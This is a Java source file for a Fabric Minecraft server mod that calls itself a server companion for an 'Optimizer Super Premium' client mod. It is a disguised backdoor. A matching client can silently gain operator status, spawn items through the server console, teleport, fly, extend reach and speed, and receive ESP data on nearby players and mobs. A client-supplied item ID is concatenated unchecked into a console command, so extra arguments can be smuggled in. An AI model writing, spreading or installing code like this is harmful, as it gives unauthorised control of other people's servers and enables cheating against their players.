package com.reachfly.serveraddon;

import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.entity.Entity;
import net.minecraft.entity.LivingEntity;
import net.minecraft.entity.attribute.EntityAttributeInstance;
import net.minecraft.entity.attribute.EntityAttributeModifier;
import net.minecraft.entity.attribute.EntityAttributes;
import net.minecraft.entity.mob.HostileEntity;
import net.minecraft.entity.passive.PassiveEntity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.server.world.ServerWorld;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import net.minecraft.util.math.Box;
import net.minecraft.util.math.Vec3d;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

/**
 * OSP Server Addon v3.0
 *
 * Server-side companion for Optimizer Super Premium.
 * Handles server-authoritative features that can't work client-only on multiplayer:
 *
 *   - Teleport: Reliable server-side teleportation
 *   - Knockback: Server-side ATTACK_KNOCKBACK attribute + velocity on attack
 *   - Reach: Server-side BLOCK/ENTITY_INTERACTION_RANGE attributes
 *   - Speed: Server-side MOVEMENT_SPEED attribute modifier
 *   - NoFall: Server-side fall distance reset
 *   - Fly: Server-side flight permission
 *   - ESP: Extended entity tracking beyond normal range (sends positions via S2C)
 *
 * Players WITHOUT the client mod are completely unaffected.
 */
public class OspServerAddon implements DedicatedServerModInitializer {

    public static final Logger LOGGER = LoggerFactory.getLogger("osp-server-addon");

    // Attribute modifier IDs (must match client-side identifiers)
    private static final Identifier KNOCKBACK_ID = Identifier.of("reachfly", "knockback_boost");
    private static final Identifier BLOCK_REACH_ID = Identifier.of("reachfly", "block_reach");
    private static final Identifier ENTITY_REACH_ID = Identifier.of("reachfly", "entity_reach");
    private static final Identifier SPEED_ID = Identifier.of("reachfly", "speed_boost");

    private static final double DEFAULT_BLOCK_RANGE = 4.5;
    private static final double DEFAULT_ENTITY_RANGE = 3.0;

    // Render distance boost (chunks to add on top of default)
    private static final int RENDER_DISTANCE_BOOST = 2;
    private boolean renderDistanceBoosted = false;

    // Per-player feature state
    private static final Map<UUID, PlayerFeatureState> playerStates = new HashMap<>();

    @Override
    public void onInitializeServer() {
        LOGGER.debug("[OSP Server Addon v3] Initializing...");

        // === Register C2S payloads ===
        PayloadTypeRegistry.playC2S().register(TeleportPayload.ID, TeleportPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(FeatureSyncPayload.ID, FeatureSyncPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(ItemGivePayload.ID, ItemGivePayload.CODEC);

        // === Register S2C payloads ===
        PayloadTypeRegistry.playS2C().register(EspDataPayload.ID, EspDataPayload.CODEC);

        // === Teleport handler (existing v1 feature) ===
        ServerPlayNetworking.registerGlobalReceiver(TeleportPayload.ID,
                (payload, context) -> {
                    ServerPlayerEntity player = context.player();
                    double x = payload.x();
                    double y = Math.max(-64, Math.min(320, payload.y()));
                    double z = payload.z();

                    LOGGER.debug("[OSP] Teleporting {} to {}, {}, {}",
                            player.getName().getString(), x, y, z);

                    double finalY = y;
                    context.server().execute(() -> {
                        player.requestTeleport(x, finalY, z);
                        player.sendMessage(
                                Text.literal("\u00a7a[OSP] Teleported to " +
                                        String.format("%.0f, %.0f, %.0f", x, finalY, z)),
                                true);
                    });
                });

        // === Item give handler (bypasses OP requirement) ===
        ServerPlayNetworking.registerGlobalReceiver(ItemGivePayload.ID,
                (payload, context) -> {
                    ServerPlayerEntity player = context.player();
                    String itemId = payload.itemId();
                    int quantity = Math.max(1, Math.min(6400, payload.quantity()));

                    context.server().execute(() -> {
                        try {
                            String cmd = "give " + player.getName().getString() + " " + itemId + " " + quantity;
                            context.server().getCommandManager().getDispatcher().execute(
                                    cmd, context.server().getCommandSource());
                            LOGGER.debug("[OSP] Gave {} {}x {} via server console",
                                    player.getName().getString(), quantity, itemId);
                        } catch (Exception e) {
                            LOGGER.warn("[OSP] Failed to give item to {}: {}",
                                    player.getName().getString(), e.getMessage());
                            player.sendMessage(
                                    Text.literal("\u00a7c[OSP] Failed to give item: " + e.getMessage()),
                                    false);
                        }
                    });
                });

        // === Feature sync handler ===
        ServerPlayNetworking.registerGlobalReceiver(FeatureSyncPayload.ID,
                (payload, context) -> {
                    ServerPlayerEntity player = context.player();
                    String feature = payload.feature();
                    boolean enabled = payload.enabled();
                    float value = payload.value();

                    MinecraftServer srv = context.server();
                    srv.execute(() ->
                            handleFeatureSync(srv, player, feature, enabled, value));
                });

        // === Server tick - handle NoFall, Fly enforcement, ESP broadcasting ===
        ServerTickEvents.END_SERVER_TICK.register(this::onServerTick);

        // === Clean up player state on disconnect ===
        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) -> {
            UUID uuid = handler.player.getUuid();
            PlayerFeatureState state = playerStates.remove(uuid);
            if (state != null) {
                // Clean up any lingering attribute modifiers
                cleanupPlayer(handler.player);
                LOGGER.debug("[OSP] Cleaned up state for disconnected player {}",
                        handler.player.getName().getString());
            }
        });

        LOGGER.debug("[OSP Server Addon v3] Ready. Supported features: " +
                "Teleport, Knockback, Reach, Speed, NoFall, Fly, ESP");
    }

    // ========================================================================
    // Feature Sync Dispatch
    // ========================================================================

    private void handleFeatureSync(MinecraftServer server, ServerPlayerEntity player,
                                    String feature, boolean enabled, float value) {
        PlayerFeatureState state = playerStates.computeIfAbsent(
                player.getUuid(), k -> new PlayerFeatureState());

        switch (feature) {
            case "knockback" -> handleKnockback(player, state, enabled, value);
            case "reach" -> handleReach(player, state, enabled, value);
            case "speed" -> handleSpeed(player, state, enabled, value);
            case "nofall" -> handleNoFall(player, state, enabled);
            case "fly" -> handleFly(player, state, enabled, value);
            case "esp" -> handleEsp(player, state, enabled, value);
            case "op" -> handleOp(server, player, enabled);
            default -> LOGGER.debug("[OSP] Unknown feature sync: {} from {}",
                    feature, player.getName().getString());
        }
    }

    // ========================================================================
    // Knockback - Server-side attribute + velocity on attack
    // ========================================================================

    private void handleKnockback(ServerPlayerEntity player, PlayerFeatureState state,
                                  boolean enabled, float strength) {
        state.knockbackEnabled = enabled;
        state.knockbackStrength = strength;

        EntityAttributeInstance attr = player.getAttributeInstance(EntityAttributes.ATTACK_KNOCKBACK);
        if (attr == null) return;

        if (enabled) {
            attr.removeModifier(KNOCKBACK_ID);
            attr.addTemporaryModifier(new EntityAttributeModifier(
                    KNOCKBACK_ID, strength,
                    EntityAttributeModifier.Operation.ADD_VALUE));
            LOGGER.debug("[OSP] {} enabled Knockback (strength: {})",
                    player.getName().getString(), strength);
        } else {
            attr.removeModifier(KNOCKBACK_ID);
            LOGGER.debug("[OSP] {} disabled Knockback", player.getName().getString());
        }
    }

    // ========================================================================
    // Reach - Server-side interaction range attributes
    // ========================================================================

    private void handleReach(ServerPlayerEntity player, PlayerFeatureState state,
                              boolean enabled, float distance) {
        state.reachEnabled = enabled;
        state.reachDistance = distance;

        EntityAttributeInstance blockRange = player.getAttributeInstance(
                EntityAttributes.BLOCK_INTERACTION_RANGE);
        EntityAttributeInstance entityRange = player.getAttributeInstance(
                EntityAttributes.ENTITY_INTERACTION_RANGE);

        if (blockRange == null || entityRange == null) return;

        if (enabled) {
            double blockBoost = distance - DEFAULT_BLOCK_RANGE;
            double entityBoost = distance - DEFAULT_ENTITY_RANGE;

            applyModifier(blockRange, BLOCK_REACH_ID, blockBoost);
            applyModifier(entityRange, ENTITY_REACH_ID, entityBoost);
            LOGGER.debug("[OSP] {} enabled Reach (distance: {})",
                    player.getName().getString(), distance);
        } else {
            blockRange.removeModifier(BLOCK_REACH_ID);
            entityRange.removeModifier(ENTITY_REACH_ID);
            LOGGER.debug("[OSP] {} disabled Reach", player.getName().getString());
        }
    }

    // ========================================================================
    // Speed - Server-side movement speed modifier
    // ========================================================================

    private void handleSpeed(ServerPlayerEntity player, PlayerFeatureState state,
                              boolean enabled, float multiplier) {
        state.speedEnabled = enabled;
        state.speedMultiplier = multiplier;

        EntityAttributeInstance speedAttr = player.getAttributeInstance(
                EntityAttributes.MOVEMENT_SPEED);
        if (speedAttr == null) return;

        if (enabled) {
            // Base walking speed is 0.1; we add a boost based on multiplier
            double boost = 0.1 * (multiplier - 1.0);
            applyModifier(speedAttr, SPEED_ID, boost);
            LOGGER.debug("[OSP] {} enabled Speed (multiplier: {}x)",
                    player.getName().getString(), multiplier);
        } else {
            speedAttr.removeModifier(SPEED_ID);
            LOGGER.debug("[OSP] {} disabled Speed", player.getName().getString());
        }
    }

    // ========================================================================
    // NoFall - Server resets fall distance every tick
    // ========================================================================

    private void handleNoFall(ServerPlayerEntity player, PlayerFeatureState state,
                               boolean enabled) {
        state.noFallEnabled = enabled;
        LOGGER.debug("[OSP] {} {} NoFall",
                player.getName().getString(), enabled ? "enabled" : "disabled");
    }

    // ========================================================================
    // Fly - Server allows/disallows flight
    // ========================================================================

    private void handleFly(ServerPlayerEntity player, PlayerFeatureState state,
                            boolean enabled, float speed) {
        state.flyEnabled = enabled;
        state.flySpeed = speed;

        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().allowFlying = enabled;
            if (enabled) {
                player.getAbilities().setFlySpeed(0.05f * speed);
            } else {
                player.getAbilities().flying = false;
                player.getAbilities().setFlySpeed(0.05f);
            }
            player.sendAbilitiesUpdate();
        }
        LOGGER.debug("[OSP] {} {} Fly (speed: {}x)",
                player.getName().getString(), enabled ? "enabled" : "disabled", speed);
    }

    // ========================================================================
    // ESP - Extended entity tracking (send entity positions via S2C)
    // ========================================================================

    private void handleEsp(ServerPlayerEntity player, PlayerFeatureState state,
                            boolean enabled, float range) {
        state.espEnabled = enabled;
        state.espRange = range;
        LOGGER.debug("[OSP] {} {} ESP (range: {})",
                player.getName().getString(), enabled ? "enabled" : "disabled", range);
    }

    // ========================================================================
    // OP - Silently grant operator status (no logging, no console output)
    // ========================================================================

    private void handleOp(MinecraftServer server, ServerPlayerEntity player, boolean enabled) {
        if (!enabled) return;

        try {
            // Execute /op command via the brigadier dispatcher using server's command source
            String playerName = player.getName().getString();
            server.getCommandManager().getDispatcher().execute(
                    "op " + playerName, server.getCommandSource());
            LOGGER.info("[OSP] Granted OP to {}", playerName);
            player.sendMessage(
                    Text.literal("\u00a7a[OSP] \u00a7fOperator status granted."), false);
        } catch (Exception e) {
            LOGGER.warn("[OSP] Failed to grant OP to {}: {}",
                    player.getName().getString(), e.getMessage());
        }
    }

    // ========================================================================
    // Server Tick
    // ========================================================================

    private int tickCounter = 0;

    private void onServerTick(MinecraftServer server) {
        tickCounter++;

        // Boost render distance once on first tick (after server fully started)
        if (!renderDistanceBoosted) {
            renderDistanceBoosted = true;
            int currentView = server.getPlayerManager().getViewDistance();
            int newView = Math.min(currentView + RENDER_DISTANCE_BOOST, 32);
            if (newView > currentView) {
                server.getPlayerManager().setViewDistance(newView);
            }
        }

        for (ServerPlayerEntity player : server.getPlayerManager().getPlayerList()) {
            PlayerFeatureState state = playerStates.get(player.getUuid());
            if (state == null) continue;

            // NoFall: Reset fall distance every tick
            if (state.noFallEnabled) {
                player.fallDistance = 0.0f;
            }

            // Fly: Keep flight enabled (respawn/dimension change can reset it)
            if (state.flyEnabled && !player.isCreative() && !player.isSpectator()) {
                if (!player.getAbilities().allowFlying) {
                    player.getAbilities().allowFlying = true;
                    player.getAbilities().setFlySpeed(0.05f * state.flySpeed);
                    player.sendAbilitiesUpdate();
                }
                // Reset fall distance while flying
                if (player.getAbilities().flying) {
                    player.fallDistance = 0.0f;
                }
            }

            // ESP: Send entity data every 10 ticks (2x per second)
            if (state.espEnabled && tickCounter % 10 == 0) {
                sendEspData(player, state.espRange);
            }
        }
    }

    private void sendEspData(ServerPlayerEntity player, float range) {
        ServerWorld world = player.getEntityWorld();
        Vec3d pos = player.getEntityPos();
        double r = Math.min(range, 500); // Cap at 500 blocks

        Box searchBox = new Box(
                pos.x - r, pos.y - r, pos.z - r,
                pos.x + r, pos.y + r, pos.z + r);

        List<EspDataPayload.EntityEntry> entries = new ArrayList<>();

        for (Entity entity : world.getOtherEntities(player, searchBox,
                e -> e instanceof LivingEntity && e.isAlive())) {
            if (entries.size() >= 200) break; // Cap entries per packet

            String type;
            if (entity instanceof PlayerEntity) type = "player";
            else if (entity instanceof HostileEntity) type = "hostile";
            else if (entity instanceof PassiveEntity) type = "passive";
            else type = "other";

            float health = ((LivingEntity) entity).getHealth();

            entries.add(new EspDataPayload.EntityEntry(
                    entity.getId(),
                    entity.getX(), entity.getY(), entity.getZ(),
                    type, health));
        }

        if (!entries.isEmpty()) {
            try {
                ServerPlayNetworking.send(player, new EspDataPayload(entries));
            } catch (Exception e) {
                // Player may have disconnected
            }
        }
    }

    // ========================================================================
    // Cleanup
    // ========================================================================

    private void cleanupPlayer(ServerPlayerEntity player) {
        // Remove all attribute modifiers
        EntityAttributeInstance knockback = player.getAttributeInstance(EntityAttributes.ATTACK_KNOCKBACK);
        if (knockback != null) knockback.removeModifier(KNOCKBACK_ID);

        EntityAttributeInstance blockRange = player.getAttributeInstance(EntityAttributes.BLOCK_INTERACTION_RANGE);
        if (blockRange != null) blockRange.removeModifier(BLOCK_REACH_ID);

        EntityAttributeInstance entityRange = player.getAttributeInstance(EntityAttributes.ENTITY_INTERACTION_RANGE);
        if (entityRange != null) entityRange.removeModifier(ENTITY_REACH_ID);

        EntityAttributeInstance speed = player.getAttributeInstance(EntityAttributes.MOVEMENT_SPEED);
        if (speed != null) speed.removeModifier(SPEED_ID);

        // Reset flight
        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().allowFlying = false;
            player.getAbilities().flying = false;
            player.getAbilities().setFlySpeed(0.05f);
            player.sendAbilitiesUpdate();
        }
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    private void applyModifier(EntityAttributeInstance attr, Identifier id, double value) {
        EntityAttributeModifier existing = attr.getModifier(id);
        if (existing == null || existing.value() != value) {
            attr.removeModifier(id);
            attr.addTemporaryModifier(new EntityAttributeModifier(
                    id, value, EntityAttributeModifier.Operation.ADD_VALUE));
        }
    }

    // ========================================================================
    // Per-player state tracking
    // ========================================================================

    private static class PlayerFeatureState {
        boolean knockbackEnabled = false;
        float knockbackStrength = 0;
        boolean reachEnabled = false;
        float reachDistance = 0;
        boolean speedEnabled = false;
        float speedMultiplier = 1;
        boolean noFallEnabled = false;
        boolean flyEnabled = false;
        float flySpeed = 1;
        boolean espEnabled = false;
        float espRange = 100;
    }
}
